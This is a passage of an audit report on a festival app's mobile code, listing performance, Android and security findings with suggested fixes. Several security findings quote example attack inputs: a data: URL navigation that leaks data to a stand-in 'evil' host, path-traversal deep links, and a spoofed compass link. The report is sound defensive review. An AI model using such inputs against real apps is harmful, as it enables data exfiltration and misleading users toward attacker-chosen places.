The Cards FlatList passes a fresh component type each render: `ItemSeparatorComponent={() => <View style={styles.separator} />}` (index.tsx:615). Because the function identity changes per render, React treats it as a new component and unmounts/remounts every separator whenever the screen re-renders — which on this screen is every search keystroke and every store update. FestivalList.tsx:192 has the identical pattern (`ItemSeparatorComponent={() => <View style={styles.separator} />}`). picks.tsx already does this correctly with a named top-level `Separator` component.

**Suggested fix:** Hoist a named Separator component (as picks.tsx does) and pass `ItemSeparatorComponent={Separator}` in both files.

### [LOW] Stage carousel FlatList: fixed-width snap columns without getItemLayout or render-window tuning

- **File:** `packages/mobile/components/TimelineView.tsx:393`
- **Dimension:** performance · **Effort:** trivial

The horizontal stage carousel uses `snapToInterval={columnWidth + 8}` with a fixed `columnWidth` (lines 393-407) but provides no `getItemLayout`, no `initialNumToRender`, and no `windowSize`. Each item is a FULL StageColumn — a whole day of ~100 gridline Views plus all set blocks — and FlatList's defaults (initialNumToRender 10, windowSize 21) mean a multi-stage festival builds many offscreen full-day columns on first paint even though roughly one column is visible at a time, inflating time-to-interactive on the most-used screen.

**Suggested fix:** Add `getItemLayout={(­_, i) => ({ length: columnWidth + 8, offset: (columnWidth + 8) * i, index: i })}`, `initialNumToRender={2}`, `windowSize={3}`, and `maxToRenderPerBatch={2}` to the carousel FlatList.

### [LOW] Switching active crew tears down and rebuilds the entire Socket.IO connection

- **File:** `packages/mobile/hooks/useRealtimeSync.ts:510`
- **Dimension:** performance · **Effort:** small

The single connection effect lists the crew id in its deps: `}, [userToken, currentFestivalId, activeCrewId, setConnected, setOnlineUsers]);` (line 510). Changing the active crew (a routine action via the crew-switcher chips in crew.tsx) runs the full cleanup — `socket.disconnect()` — then creates a brand-new socket, re-handshakes, re-registers ~25 listeners, and re-joins the festival room, when the protocol already supports the cheap path (the cleanup itself emits `leave:crew` and connect emits `join:crew`). On festival networks where the websocket handshake is the expensive part, every crew switch costs a reconnect round-trip plus a presence/connected-state flap.

**Suggested fix:** Drop `activeCrewId` from the connection effect's deps and move crew-room membership into a separate small effect that emits `leave:crew` for the previous id and `join:crew` for the new id on the existing `socketRef.current` when it is connected.

### [LOW] CrewActivity polls the activity endpoint every 30s on top of socket-driven reloads

- **File:** `packages/mobile/components/CrewActivity.tsx:59`
- **Dimension:** performance · **Effort:** trivial

CrewActivity sets up `const interval = setInterval(() => { loadActivity(crewId).catch(() => {}); }, 30_000);` (lines 59-62) for as long as the Logistics tab is mounted. But useRealtimeSync already reloads activity reactively — its `crew:activity` handler schedules a debounced `loadActivity(id)` (useRealtimeSync.ts:273-284) — so while the socket is connected every poll is redundant network + a store write that re-renders the whole Logistics ScrollView (which also hosts the map, packing, rides, meeting points). At a festival this is sustained needless radio wake-ups every 30s.

**Suggested fix:** Drop the interval and rely on the socket reload plus the existing pull-to-refresh; if a fallback is wanted, poll only when `useUIStore.getState().connected` is false, or refresh once on tab focus.

### [LOW] Crew members FlatList renderItem is an inline anonymous closure on a 15-state screen

- **File:** `packages/mobile/app/(tabs)/crew.tsx:655`
- **Dimension:** performance · **Effort:** small

The members list passes `renderItem={({ item }) => { ... }}` inline (crew.tsx:655-705) on a screen holding ~15 useState values (name, inviteCode, busy flags, crewTab, etc.). Every keystroke in the create/join TextInputs and every busy-flag toggle re-renders CrewScreen, recreating renderItem and re-rendering all visible member rows (and the large ListFooterComponent element tree). Crews are small so this is bounded, but it is the same screen where typing latency is most observable (TextInput inside KeyboardAvoidingView).

**Suggested fix:** Extract a memoized MemberRow component and a useCallback'd renderItem (deps: crew.id, isOwner, user.id, handlers), mirroring the pattern already used in FestivalList/picks.

### [LOW] Deep-link setId is interpolated unencoded into an authenticated API path

- **File:** `packages/mobile/app/set/[setId].tsx:119`
- **Dimension:** security · **Effort:** trivial

The set-detail screen takes `setId` straight from the deep link (`const { setId } = useLocalSearchParams<{ setId: string }>()`, line 90) and splices it raw into an API path: `const { festivalId } = await api.get<{ festivalId: string }>(`/festivals/locate-set/${setId}`)`. The shared api client does no encoding either — `fetch(`${_apiBase}${path}`)` (packages/shared/src/services/api.ts:323). expo-router percent-DECODES route params, so a crafted link the victim taps (festie://set/..%2F..%2Fsome-endpoint or a festie.us/set/..%2F.. universal link) yields a setId containing `/`, `..`, `?` or `#`; fetch's URL normalization then collapses the dot segments and the authenticated GET (Bearer token attached) is redirected to an arbitrary endpoint under /api/v1 chosen by the link author. Impact is bounded (GET-only, response stays in-app and is only read as `festivalId`), but this is exactly the untrusted-deep-link-param-into-API-call pattern, and the same screen is the app's primary universal-link entry point.

**Suggested fix:** Validate or encode the param before building the path: reject anything not matching the set-id format (e.g. `/^[A-Za-z0-9_-]{1,64}$/.test(setId)` -> show the not-found state), or at minimum use `api.get(`/festivals/locate-set/${encodeURIComponent(setId)}`)`. Consider doing the encodeURIComponent centrally for all interpolated path segments built from router params.

### [LOW] Android allowBackup not disabled — app data (offline crew/location cache) is cloud-backed-up by default

- **File:** `packages/mobile/app.json:45`
- **Dimension:** security · **Effort:** trivial

The `"android"` block (`"package": "us.festie.app", "googleServicesFile": ...`) sets no `allowBackup` key, so Expo prebuild emits the template default `android:allowBackup="true"`. Android Auto Backup then ships the app's data dir — including AsyncStorage, which by design holds the offline read-cache (crew meeting-point coordinates, member lists, the persisted `festie-auth` user blob, and the FCM push token cached under `festie-push-token` in useMobilePush.ts:98) — to the user's Google account/transfers to new devices. Session tokens are safe (SecureStore values are wrapped by non-exportable Keystore keys), but for an app whose most sensitive data is crew location info, silently backing the cache up to a third-party cloud widens exposure (e.g. device-to-device restore onto a device the user no longer controls) for no product benefit.

**Suggested fix:** Add `"allowBackup": false` to the `android` block in app.json (supported app.json key; prebuild maps it to android:allowBackup="false"). Alternatively, if backup is wanted for UX, add a backup-rules XML excluding AsyncStorage and SecureStore prefs — but full opt-out is the simpler, safer default here.

### [LOW] Map WebView navigation guard allows top-frame data:/blob: navigation, which sheds the in-document CSP

- **File:** `packages/mobile/components/OfflineMap.tsx:126`
- **Dimension:** security · **Effort:** small

The otherwise default-deny guard returns true for ALL data:/blob: URLs regardless of frame: `if (url === 'about:blank' || url.startsWith('about:') || url.startsWith('data:') || url.startsWith('blob:')) { return true; }`. MapLibre only needs data:/blob: for workers and image SUBRESOURCES, which never pass through onShouldStartLoadWithRequest — only (top-)frame navigations do. The exfiltration containment for the map document is its CSP `<meta>` (connect-src/img-src limited to unpkg + OSM tiles), but a script payload that somehow ran inside the document (the exact scenario this defense-in-depth layer exists for, post-H3) could execute `location = 'data:text/html,<img src=https://evil/?d=...>'`: the new data: document carries NO CSP, and its image/fetch subresource loads to attacker hosts are not consulted by the navigation guard, restoring the exfil channel the CSP was added to close. `domStorageEnabled` (line 666) is also switched on though the map document never uses DOM storage — needless extra surface in the same WebView.

**Suggested fix:** Gate data:/blob: on frame: `if (url.startsWith('data:') || url.startsWith('blob:')) return req.isTopFrame === false;` (keep `about:blank`/`about:` allowed for the inline document itself). Also drop the unused `domStorageEnabled` prop from the WebView.

### [LOW] Compass deep link accepts arbitrary external coordinates/label with no provenance check

- **File:** `packages/mobile/app/compass.tsx:79`
- **Dimension:** security · **Effort:** small

CompassScreen prefers raw deep-link params over trusted store data: `const lat = paramNumber(params.latitude); const lng = paramNumber(params.longitude); if (Number.isFinite(lat) && Number.isFinite(lng)) { return { label: paramString(params.label) ?? 'Meeting point', latitude: lat, longitude: lng }; }`. Because the app registers the public `festie:` scheme (app.json `"scheme": "festie"`), any app or webpage can open `festie://compass?label=Medical%20Tent&latitude=..&longitude=..` and the compass will render the attacker's label and physically point the user toward attacker-chosen coordinates, indistinguishable from a crew meeting point. Coordinates are also not range-clamped (only Number.isFinite). For a safety-oriented feature whose purpose is walking toward your crew, untrusted external input flowing straight into the guidance UI with no confirmation or origin indication is a real (if social-engineering-dependent) lure vector. The in-app callers could equally pass `mpId` (branch 2, line 85), which is validated against the persisted store.

**Suggested fix:** Drop the raw latitude/longitude/label params and make in-app callers pass only `mpId` (already supported, looked up against the trusted crewStore); or, if raw coords must remain for internal navigation, clamp lat to [-90,90] / lng to [-180,180] and show an explicit confirmation banner ("Opened from a link — verify with your crew") when the screen is entered via an external URL.

### [LOW] Inline arrow ItemSeparatorComponent recreates the separator component type every render

- **File:** `packages/mobile/app/(tabs)/index.tsx:615`
- **Dimension:** performance · **Effort:** trivial

The Cards-view FlatList passes `ItemSeparatorComponent={() => <View style={styles.separator} />}` — a new function (new component type) on every TimelineScreen render. Since this screen re-renders on every search keystroke (store-backed search), every 60s set-status tick, and every store update, React treats each separator as a different component type and unmounts/remounts all visible separators each time instead of bailing out. The same anti-pattern is in components/FestivalList.tsx:192 (`ItemSeparatorComponent={() => <View style={styles.separator} />}`). Notably picks.tsx already does this correctly with a hoisted `Separator` component (picks.tsx:502,516).

**Suggested fix:** Hoist the separator to a module-level component (as picks.tsx's `Separator` does) and pass the stable reference: `ItemSeparatorComponent={Separator}` in both index.tsx and FestivalList.tsx.

### [LOW] Schedule search recomputes filter + sort + conflict detection on every keystroke with no debounce

- **File:** `packages/mobile/app/(tabs)/index.tsx:198`
- **Dimension:** performance · **Effort:** small

`handleSearch` writes every keystroke straight into the shared store: `setSearch(text); setSearchQuery(text);` — the comment admits it: "debounce-free; the store filter recomputes filteredSets on every keystroke". Each keystroke therefore re-renders the entire screen and re-runs the `filteredSets` memo (copy + full sort, index.tsx:217-235), `getConflictingSetIds` over the filtered list (index.tsx:238), the timed/timeless splits and `timeBounds` reduction — on the JS thread, between keystrokes, for lineups of hundreds of sets on mid-range Android. The local `search` state already exists for instant TextInput echo, so debouncing the store write is a drop-in.

**Suggested fix:** Keep `setSearch(text)` immediate for input echo but debounce the `setSearchQuery(text)` store write (~150-250ms, e.g. via a ref'd setTimeout cleared per keystroke), so the heavy derived-data pipeline runs once per pause instead of once per character.

### [LOW] FestivalList sort comparator re-derives festivalStatus (date parsing) per comparison

- **File:** `packages/mobile/components/FestivalList.tsx:111`
- **Dimension:** performance · **Effort:** trivial

The sort in `sortedFestivals` calls `rank(a)`/`rank(b)` inside the comparator, and `rank` invokes `festivalStatus(f)` (which parses startDate/endDate into Dates and compares against now) on every comparison: `const rank = (f: Festival): number => { const s = festivalStatus(f); ... }` used in `[...festivals].sort((a, b) => { const ra = rank(a); const rb = rank(b); ... })`. That's O(n log n) repeated Date parses per render of the picker instead of O(n) — small list today, but it's pure waste and the decorate-sort-undecorate fix is one line of restructuring. FestivalCard (line 31-33) then computes `festivalStatus(festival)` again per row, un-memoized, on every list re-render (renderItem identity changes whenever `isLoading` flips).

**Suggested fix:** Precompute `const decorated = festivals.map((f) => ({ f, rank: rankOf(festivalStatus(f)), key: f.startDate || '' }))`, sort the decorated array, and map back — and wrap FestivalCard in React.memo so refresh-spinner state changes don't re-render every row.

### [LOW] Timeline now-line ticks re-render every StageColumn and rebuild all set blocks

- **File:** `packages/mobile/components/TimelineView.tsx:334`
- **Dimension:** performance · **Effort:** small

`renderStage` lists `nowIndicator` (refreshed by useNowIndicator's 30s tick) and the local `nowMs` 60s tick among the re-creation triggers, and passes `nowIndicator={nowIndicator}` into every StageColumn. StageColumn is not memoized, so each 30s tick re-renders every mounted stage column — re-mapping all `timeLabels` gridlines and all absolutely-positioned set TouchableOpacity blocks (`{sets.map((s) => { const startMin = timeToMinutes(s.startTime); ... })}` at line 149) — just to move a 2px now-line. The set blocks and gridlines depend only on sets/timeBounds/stageColor and are static between ticks.

**Suggested fix:** Split the NOW line into its own small overlay component that alone consumes `nowIndicator` (positioned absolutely over the column scroll content), wrap StageColumn in React.memo, and stop passing `nowIndicator` into the column body so ticks re-render only the 2px overlay.

### [LOW] KeyboardAvoidingView uses behavior 'height' on Android on top of the default resize keyboard mode

- **File:** `packages/mobile/app/(tabs)/crew.tsx:456`
- **Dimension:** android-keyboard · **Effort:** small

Seven screens use the pattern `<KeyboardAvoidingView ... behavior={Platform.OS === 'ios' ? 'padding' : 'height'}>` (crew.tsx:456 and :559, account.tsx:98, login.tsx:49, register.tsx:79, forgot-password.tsx:61, reset-password.tsx:85). app.json sets no `android.softwareKeyboardLayoutMode`, so the default `resize` applies: the window content already shrinks for the keyboard, and KAV's `height` behavior applies a second height adjustment when its frame changes. Under SDK 54's always-on edge-to-edge this is the classic source of content jumping or a leftover keyboard-height gap after dismiss on Android.

**Suggested fix:** On Android pass `behavior={undefined}` (or `enabled={Platform.OS === 'ios'}`) and let adjustResize do the work — ideally via one shared wrapper component instead of seven copies of the ternary; verify the crew chat input on a gesture-nav Android device.

### [LOW] predictiveBackGestureEnabled: false is a deprecated opt-out that Android 16 ignores for apps targeting SDK 36

- **File:** `packages/mobile/app.json:54`
- **Dimension:** android-back-handling · **Effort:** trivial

`"predictiveBackGestureEnabled": false` maps to android:enableOnBackInvokedCallback="false". Today (targetSdk 35 on the current Expo SDK in this tree) it works, but as soon as the app targets Android 16 (API 36 — the stated post-upgrade compileSdk) the system ignores the opt-out and enables predictive back unconditionally. The app declares no BackHandler usage (grep finds none), so the gesture itself should be safe — meaning the flag is dead weight that hides predictive-back regressions (e.g. the crew chat / modal `set/[setId]` presentation) until the opt-out stops working.

**Suggested fix:** Remove the flag (or set it true), and smoke-test back-gesture behavior on Android 15/16 — particularly dismissing the modal set/[setId] screen and the crew tab's keyboard-open state — so any issue surfaces now rather than when the opt-out is force-disabled.

### [LOW] Stale pre-upgrade comments claim the iOS Live Activity is still a no-op native spike

- **File:** `packages/mobile/hooks/useOngoingNotification.ts:143`
- **Dimension:** leftover-pre-upgrade · **Effort:** trivial

Two comment blocks still describe the pre-SDK-56 NativeModules-stub world. Lines 143-145: "iOS: intentional no-op. The Live Activity (ActivityKit) equivalent is a deferred native spike — see the hook docblock." and the docblock lines 23-26: "a no-op until the ActivityKit Widget Extension is built into the app (config-plugin + Swift, see docs/plans/ios-live-activity-runbook.md), so the JS wiring ships safely over-the-air and activates the moment the native widget lands in a build." Both are now false — the expo-widgets implementation is live in this branch (the second iOS effect at lines 181-192 actively drives it). Future readers/agents will conclude iOS support is unimplemented.

**Suggested fix:** Rewrite both comments to describe the current expo-widgets implementation (the Android guard at line 146 is still needed, but its justification is "Notifications presentation is Android-only", not "iOS is deferred").

### [LOW] Widget hard-codes wrong brand aqua (#16E0C8) — diverges from shared token #00e8d0

- **File:** `packages/mobile/widgets/NowNextActivity.tsx:24`
- **Dimension:** branding-consistency · **Effort:** trivial

`const AQUA = '#16E0C8';` is used for every accent in the Live Activity (banner title, compact trailing, expanded center, music.note icons), but the canonical brand accent is `aqua: '#00e8d0'` (packages/shared/src/tokens/colors.ts:45) — the same token the NativeTabs tintColor uses via `colors.accent.aqua`. The Dynamic Island / Lock Screen surface will render a visibly different teal than the app chrome, violating the accent rule the design review just locked in.

**Suggested fix:** Use the shared token value. If the expo-widgets SwiftUI compiler can't resolve the cross-package import, inline '#00e8d0' with a comment pointing at packages/shared/src/tokens/colors.ts as the source of truth.

### [LOW] liveActivitySupported export changed semantics and is now dead/misleading

- **File:** `packages/mobile/lib/liveActivity.ts:30`
- **Dimension:** dead-code · **Effort:** trivial

`export const liveActivitySupported = Platform.OS === 'ios';` — in the pre-upgrade version this meant "the native ActivityKit module is present in the running binary"; now it is true on every iOS runtime, including Expo Go where `loadWidget()`'s `require('../widgets/NowNextActivity')` throws and silently returns null. `git grep` shows no remaining call sites — it is exported but unused. A future settings toggle built on it would show "supported" in environments where start() can never succeed, and it doesn't reflect the real gates either (iOS >= 16.2, Live Activities enabled in Settings).

**Suggested fix:** Either delete the export, or make it honest: derive it from a successful loadWidget() (and document that ActivityKit availability/authorization is still only known at start() time).

### [LOW] @types/react skew across the workspace: mobile typechecks shared source against 19.1 types while web/shared use 19.2, with runtime react pinned 19.1.0

- **File:** `packages/mobile/package.json:64`
- **Dimension:** dependencies · **Effort:** trivial

mobile declares `"@types/react": "~19.1.17"` while web (line 51) and shared (line 35) declare `"@types/react": "^19.2.15"` — yet all three pin runtime `"react": "19.1.0"`. Since mobile's tsconfig includes shared source files directly (`"../shared/src/types/window.d.ts"` etc., and @festie/shared resolves to TS source), the same shared code is typechecked against two different React type versions, and web/shared's types are a minor version ahead of the actual runtime (19.2 type surface on a 19.1 runtime). The pnpm override `"@types/react-dom": "~19.1.0"` (packages/package.json line 16) further pairs 19.1 react-dom types with 19.2 react types (lockfile: `19.1.11(@types/react@19.2.15)`).

**Suggested fix:** Align all three packages on one @types/react line matching the runtime — `~19.1.x` everywhere while react is 19.1.0 (or bump react+types together). Consider a pnpm override for @types/react like the existing @types/react-dom one to enforce a single version.

### [LOW] Local reminder notification shows the start time in the device timezone while fire times are festival-TZ anchored

- **File:** `packages/mobile/hooks/useLocalReminders.ts:153`
- **Dimension:** correctness · **Effort:** trivial

`const startLabel = new Date(entry.startMs).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });` formats the set's absolute start instant in the DEVICE-local zone, but the reminder plan is deliberately anchored in the festival's zone (`resolveFestivalTimeZone`, line 47) and every schedule surface in the app renders the festival-local wall-clock time (`formatTime(set.startTime)`). For a user whose device zone differs from the festival's (traveling, or pre-festival at home — the FCM-backstop case), the notification body 'Starts at 5:00 PM' contradicts the 8:00 PM the schedule shows for the same set.

**Suggested fix:** Format with the festival zone: `new Date(entry.startMs).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', timeZone: festivalTimeZone })` — thread `festivalTimeZone` into `scheduleReminder` (it is already available in the effect).

### [LOW] Schedule day chips' 'today' marker is computed once per mount and goes stale across midnight

- **File:** `packages/mobile/app/(tabs)/index.tsx:119`
- **Dimension:** correctness · **Effort:** trivial

`const todayStr = useMemo(() => new Date().toLocaleDateString('en-CA'), []);` freezes 'today' at mount. At a multi-day festival the app commonly stays mounted (foreground/background cycles don't remount the tab), so after midnight the today-dot (`const isToday = day.date === todayStr;`, line 489) keeps highlighting yesterday's chip — precisely during late-night sets when users check the next day. There is no AppState/interval resync like the ones useNowNext/useNowIndicator have.

**Suggested fix:** Derive todayStr from a ticking source — e.g. reuse the existing pattern: state seeded with the date string, refreshed by an AppState 'active' listener plus a coarse interval, or compute it from useNowNext's `now`.

### [LOW] Mobile useSetStatus spins one 60s interval per SetCard and lacks foreground resync — web's shared-clock fix never ported

- **File:** `packages/mobile/hooks/useSetStatus.ts:16`
- **Dimension:** web-mobile-parity · **Effort:** small

Web's useSetStatus.ts deliberately replaced per-card timers with a single module-level clock ('Previously every SetCard spun up its own 60s setInterval ... They now all subscribe to a single module-level interval via useSyncExternalStore', web useSetStatus.ts:13-54 `useNow()`), but mobile's hook still does `useEffect(() => { const timer = setInterval(() => setNow(new Date()), 60000); ... }, [])` per component (lines 16-19) and is consumed per-card in SetCardMobile.tsx:161 — dozens of concurrent timers on the schedule list. It also has no AppState foreground resync, unlike mobile's own useNowNext.ts:48-51 and useNowIndicator.ts:28-30, so LIVE/Ended badges are stale for up to 60s after returning from background — exactly the case those sibling hooks guard against.

**Suggested fix:** Move web's `useNow` shared-clock implementation into @festie/shared (it is platform-agnostic), add an optional AppState resync on native, and have both useSetStatus hooks (and useNowNext/useNowIndicator ticks) consume it.

### [LOW] fmtClock/fmtCountdown + IMMINENT_MIN duplicated verbatim between web and mobile festival-mode screens

- **File:** `packages/mobile/app/festival-mode.tsx:16`
- **Dimension:** web-mobile-parity · **Effort:** trivial

Both festival-mode screens carry identical business constants and label logic: `const IMMINENT_MIN = 5;`, `function fmtClock(d) { return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }); }` and `function fmtCountdown(mins) { if (mins < 1) return 'starting now'; if (mins < 60) return `in ${mins}m`; ... }` appear in packages/mobile/app/festival-mode.tsx:16-28 and packages/web/src/routes/festival-mode.tsx:15-27. The countdown wording and the 5-minute 'imminent' threshold are product copy/behavior that should not be able to drift per platform.

**Suggested fix:** Move IMMINENT_MIN, fmtCountdown and fmtClock into @festie/shared/utils (format.ts) and import them in both screens — natural companion to extracting the shared now/next selector.

### [LOW] ClashPrompt overlapStartLabel and prompt copy duplicated between web and mobile

- **File:** `packages/mobile/components/ClashPrompt.tsx:37`
- **Dimension:** web-mobile-parity · **Effort:** trivial

`function overlapStartLabel(a: FestivalSet, b: FestivalSet)` (the 'earliest overlap start' math mirroring conflicts.ts) plus the user-facing clash copy ('Both X and Y are must-sees but overlap. Keep one and we'll clear the other.') are duplicated in packages/web/src/components/features/ClashPrompt.tsx:43/96-104 and packages/mobile/components/ClashPrompt.tsx:37/78-86. The overlap math belongs next to detectConflicts in shared utils/conflicts.ts; a wording or threshold tweak made on one platform will not reach the other.

**Suggested fix:** Export overlapStartLabel (and ideally a buildClashMessage helper for the copy) from @festie/shared/utils/conflicts.ts and consume it in both ClashPrompt components, leaving only the rendering platform-specific.

### [LOW] TimeBounds type and now-position percent math duplicated in the two useNowIndicator hooks

- **File:** `packages/mobile/hooks/useNowIndicator.ts:5`
- **Dimension:** web-mobile-parity · **Effort:** small

Mobile redefines the timeline TimeBounds shape locally (`export interface TimeBounds { minMin: number; maxMin: number; totalSlots: number; }`, useNowIndicator.ts:5-9) instead of sharing web's type (packages/web/src/hooks/useTimelineFilters.ts), and both hooks duplicate the now-percent computation `((nowMins - timeBounds.minMin) / (timeBounds.maxMin - timeBounds.minMin)) * 100` (web useNowIndicator.ts:24-34, mobile 37-45). Note this math uses device-local wall clock (`now.getHours() * 60 + now.getMinutes()`) — if the festival-TZ handling in shared getSetTimeBounds is ever applied to the timeline, both copies must change in lockstep.

**Suggested fix:** Move TimeBounds and a pure `nowIndicatorPercent(timeBounds, nowMs)` helper into @festie/shared/utils (festivalTime.ts), keeping only the DOM-scroll vs ScrollView-scroll halves platform-specific.

### [LOW] Notification preference toggles swallow update failures inconsistently — main rows give no feedback while festival rows Alert

- **File:** `packages/mobile/components/AccountNotificationPrefsSection.tsx:107`
- **Dimension:** silent-failures · **Effort:** trivial

All six pref rows and quiet hours use `onChange: (v) => updatePrefs({ setReminders: v }).catch(() => {})` (lines 107-137 and 166-168). notificationPrefsStore.updatePrefs rolls back optimistically on failure, so the switch snaps back — but with no message, on a settings change that gates real push behavior (e.g. turning OFF crew updates at 3am, which silently stays ON server-side). The FestivalTopicsRows sibling in the SAME file does it right: `.catch(() => { setSubs(prev); Alert.alert('Update failed', "Couldn't update notification setting. Try again."); })` (lines 56-59). The web twin has the identical gap (packages/web/src/components/account/NotificationPrefsSection.tsx:129-167, `.catch(() => {})` per row, while its own topic rows toast at line 89).

**Suggested fix:** Replace each `.catch(() => {})` with the same Alert/toast used by FestivalTopicsRows in the respective file — one shared `onPrefError` helper per component.

---

# Workspace config (packages/*) — 1 findings

### [LOW] Workspace root pins typescript ~5.8.0 while every package uses ~5.9.3 — two TS versions in the lockfile

- **File:** `packages/package.json:23`
- **Dimension:** dependencies · **Effort:** trivial

packages/package.json devDependencies has `"typescript": "~5.8.0"` (resolved 5.8.3 per lockfile lines 21-23) while web, shared, and mobile all declare `"typescript": "~5.9.3"`. Both 5.8.3 and 5.9.3 are installed (`typescript@5.8.3:` and `typescript@5.9.3:` both appear in the lockfile). Any tool invoked from the workspace root (or an editor picking the root's hoisted TS) typechecks with a different compiler than CI's per-package `tsc --noEmit`, and the stale pin is leftover pre-upgrade debt.

**Suggested fix:** Bump the root devDependency to `"typescript": "~5.9.3"` (or remove it entirely — turbo just delegates to per-package scripts that have their own TS) and reinstall to drop 5.8.3.

---

# Backend touchpoints (root) — 2 findings

### [HIGH] FCM clickAction 'OPEN_DEEP_LINK' has no matching Android intent filter — background notification taps do nothing

- **File:** `lib/notifications/send.ts:200`
- **Dimension:** android-fcm-push · **Effort:** small

buildFcmMessage sets `android.notification.clickAction: 'OPEN_DEEP_LINK'`. For notification-type FCM messages displayed while the app is backgrounded/killed, the FCM SDK builds the tap intent from click_action and launches an activity whose intent filter declares that action. Nothing in the repo declares it — `OPEN_DEEP_LINK` appears only at this line (no android/ dir, no config plugin, app.json android.intentFilters only declares VIEW for festie.us). With no matching activity, tapping a Festie push (including SOS) fails to open the app at all on Android, instead of the default behavior (launching MainActivity) you get when click_action is omitted.

**Suggested fix:** Remove `clickAction` from the android.notification block (the default tap opens the launcher activity), and instead put a deep-link URL in the data payload for the app to route on (see the missing response-listener finding). If a custom action is truly wanted, add a config plugin that injects a matching <intent-filter action="OPEN_DEEP_LINK"/> on MainActivity.

### [LOW] Data-only 'silent_sync' pushes are sent to Android devices but the app registers no background handler

- **File:** `lib/notifications/send.ts:696`
- **Dimension:** android-fcm-push · **Effort:** small

sendSilentSync builds `data: { type: 'silent_sync', syncType, festivalId, timestamp: ... }` with `android: { priority: 'high' }` and sends it to all registered device tokens. On Android, data-only FCM messages reach the app only through a registered background task (expo-notifications `registerTaskAsync`) or a foreground `addNotificationReceivedListener` — packages/mobile registers neither (grep finds no listener in the package). Every silent_sync to an Android device is wasted high-priority FCM traffic that also burns the app's FCM high-priority quota/standby-bucket budget without triggering any sync.

**Suggested fix:** Either exclude mobile (FCM device) tokens from sendSilentSync and rely on the existing Socket.IO foreground sync, or register an expo-notifications background task on Android that triggers the store refresh for `type === 'silent_sync'`.
